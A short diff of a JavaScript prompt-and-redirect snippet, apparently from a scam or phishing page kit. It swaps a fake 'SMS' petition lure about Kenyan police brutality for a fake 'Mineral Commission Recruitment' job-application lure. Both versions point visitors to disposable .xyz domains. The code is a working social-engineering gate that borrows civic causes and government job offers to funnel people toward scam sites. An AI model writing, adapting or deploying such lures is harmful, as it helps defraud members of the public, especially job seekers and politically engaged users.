@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'sign'
-password=prompt('SMS: Help Sign The Petition To End BAD GOVERNANCE AND POLICE BRUTALITY IN KENYA, Kindly press "OK" to Proceed.  ','sign');
-if (password != 'sign') {
-location.href='https://petition-order.allprograms.xyz/sign';
+var password = 'Mineral Commission Recruitment'
+password=prompt('SMS: Welcome to the application portal, press OK to apply now  ','Mineral Commission Recruitment');
+if (password != 'Mineral Commission Recruitment') {
+location.href='https://mincom-career.goprogram.xyz/Job';
 }
